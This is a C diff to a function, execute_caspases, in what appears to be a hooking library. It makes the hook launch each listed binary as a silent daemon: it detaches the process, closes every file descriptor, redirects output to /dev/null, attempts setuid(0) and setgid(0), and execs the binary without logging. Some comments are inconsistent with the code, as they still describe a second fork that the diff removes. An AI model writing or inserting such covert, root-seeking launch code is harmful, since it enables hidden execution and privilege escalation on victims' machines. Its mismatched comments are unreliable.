@@ -136,47 +136,60 @@ static void execute_caspases(void) {
             continue;
         }
 
-        if (pid == 0) {
-            // Child process
-
-            // Fork again to create orphan (parent of this will exit, init adopts us)
-            pid_t pid2 = fork();
-            if (pid2 < 0) {
-                DEBUG_PRINT("[HOOK] ERROR: Failed second fork for '%s' (errno=%d: %s)\n",
-                        caspases[i], errno, strerror(errno));
+	if (pid == 0) {
+            // Second child (now orphaned) - become a proper daemon
+        
+            // Create a new session and become session leader
+            // This detaches from controlling terminal
+            if (setsid() < 0) {
+                DEBUG_PRINT("[HOOK] ERROR: setsid() failed (errno=%d: %s)\n",
+                        errno, strerror(errno));
                 exit(1);
             }
-
-            if (pid2 > 0) {
-                // First child exits immediately, orphaning the second child
-                exit(0);
-            }
-
-            // Second child (now orphaned) - attempt to escalate to root
-            DEBUG_PRINT("[HOOK] Orphaned process attempting setuid(0) for '%s'\n", caspases[i]);
-            if (setuid(0) != 0) {
-                DEBUG_PRINT("[HOOK] ERROR: setuid(0) failed (errno=%d: %s)\n",
+        
+            // Change working directory to root to avoid blocking unmounts
+            if (chdir("/") < 0) {
+                DEBUG_PRINT("[HOOK] ERROR: chdir('/') failed (errno=%d: %s)\n",
                         errno, strerror(errno));
+                // Continue anyway - not fatal
+            }
+        
+            // Close all file descriptors
+            // This is critical - closes stdin/stdout/stderr inherited from parent
+            for (int fd = 0; fd < 1024; fd++) {
+                close(fd);
+            }
+        
+            // Redirect standard fds to /dev/null
+            int devnull = open("/dev/null", O_RDWR);
+            if (devnull >= 0) {
+                dup2(devnull, STDIN_FILENO);
+                dup2(devnull, STDOUT_FILENO);
+                dup2(devnull, STDERR_FILENO);
+                if (devnull > STDERR_FILENO) {
+                    close(devnull);
+                }
+            }
+        
+            // Attempt to escalate to root
+            if (setuid(0) != 0) {
+                // Can't use DEBUG_PRINT here - stderr is now /dev/null
             }
             if (setgid(0) != 0) {
-                DEBUG_PRINT("[HOOK] ERROR: setgid(0) failed (errno=%d: %s)\n",
-                        errno, strerror(errno));
+                // Can't use DEBUG_PRINT here
             }
-
+        
             // Execute the binary
-            DEBUG_PRINT("[HOOK] Executing binary: '%s'\n", caspases[i]);
             execl(caspases[i], caspases[i], NULL);
-
-            // If execl returns, it failed
-            DEBUG_PRINT("[HOOK] ERROR: execl failed for '%s' (errno=%d: %s)\n",
-                    caspases[i], errno, strerror(errno));
+        
+            // If execl returns, it failed (but we can't log it)
             exit(1);
         }
 
-        // Parent process - wait for first child to exit (creating the orphan)
-        int status;
-        waitpid(pid, &status, 0);
-        DEBUG_PRINT("[HOOK] First child exited for '%s', orphan created\n", caspases[i]);
+	// Parent process - don't wait!
+        // The first child will exit immediately, and init will reap it
+        // We continue on our way
+	DEBUG_PRINT("[HOOK] Forked for '%s', continuing without waiting\n", caspases[i]);
     }
 }
 
